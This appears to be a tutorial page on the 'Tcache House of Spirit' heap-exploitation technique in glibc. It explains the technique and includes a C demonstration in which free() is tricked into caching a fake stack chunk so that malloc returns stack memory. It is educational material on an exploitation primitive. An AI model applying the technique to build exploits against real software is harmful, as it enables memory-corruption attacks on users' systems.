#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Tcache House of Spirit",
    description: "A variation of House of Spirit that targets the tcache, which has fewer integrity checks than fastbins.",
    date: "2025-12-28",
    order: 28,
  ),
)<frontmatter>

= Tcache House of Spirit

== Introduction

The "Tcache House of Spirit" is a modernized version of the House of Spirit attack. It leverages the Thread Local Cache (tcache) introduced in glibc 2.26. Like the original attack, it tricks `free()` into adding a fake chunk (located in non-heap memory like the stack) into a freelist.

However, the tcache implementation in glibc is optimized for speed and lacks many of the integrity checks present in the fastbin or other bins. Specifically, `_int_free` calls `tcache_put` without verifying if the "next chunk" is valid. This makes the attack simpler to execute as fewer fake metadata fields need to be crafted.

== Prerequisites
- *Known Target Address*: The attacker needs to know the address of the memory region they want to allocate.
- *Write Primitive*: Ability to write a fake `size` field to the target memory region.
- *Free Primitive*: Ability to pass the pointer of the fake chunk to `free()`.
- *Alignment*: The pointer passed to `free()` must be 16-byte aligned on 64-bit systems.

== Example from `tcache_house_of_spirit.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	printf("This file demonstrates the house of spirit attack on tcache.\n");
	printf("It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
	printf("You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
	printf("(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");

	printf("Ok. Let's start with the example!.\n\n");


	printf("Calling malloc() once so that it sets up its memory.\n");
malloc(1);

	printf("Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
	unsigned long long *a; //pointer that will be overwritten
	unsigned long long fake_chunks[10] __attribute__((aligned(0x10))); //fake chunk region

	printf("This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);

	printf("This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	printf("... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size


	printf("Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	printf("... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");

	a = &fake_chunks[2];

	printf("Freeing the overwritten pointer.\n");
	free(a);

	printf("Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	void *b = malloc(0x30);
	printf("malloc(0x30): %p\n", b);

	assert((long)b == (long)&fake_chunks[2]);
}
```

== Attack Flow Explained

=== 1. Preparation

Unlike the fastbin version, we don't necessarily need to fill the tcache unless it's already full for that size. In this example, we assume the tcache is empty or has space.

=== 2. Craft the Fake Chunk

We only need to set the `size` field of the fake chunk.

#figure(
  table(
    columns: (auto, auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Index*], [*Address*], [*Content*], [*Note*],
    [`fake_chunks[1]`], `&fake_chunks[1]`, [`0x40`], [Fake chunk *size* field.],
    [`fake_chunks[2]`], `&fake_chunks[2]`, `...`, [Start of user data. `a` points here.],
  ),
  caption: [Simplified fake chunk layout for tcache.],
)

The "next chunk" check that exists for fastbins is skipped by tcache.

=== 3. Freeing the Fake Chunk

When `free(a)` is called, glibc checks if the chunk fits in the tcache. Since `0x40` is a tcache-sized chunk, it is placed directly into the tcache list without checking the surrounding memory.

=== 4. Allocation

The subsequent `malloc(0x30)` call finds the fake chunk at the head of the tcache and returns it.

== Comparison with Fastbin House of Spirit

| Feature | Fastbin House of Spirit | Tcache House of Spirit |
| :--- | :--- | :--- |
| **Next Chunk Size Check** | Required (must be sane) | **Not required** |
| **Tcache State** | Must be full | Must have space |
| **Speed/Simplicity** | Moderate | High |
| **Glibc Version** | Any | 2.26+ |

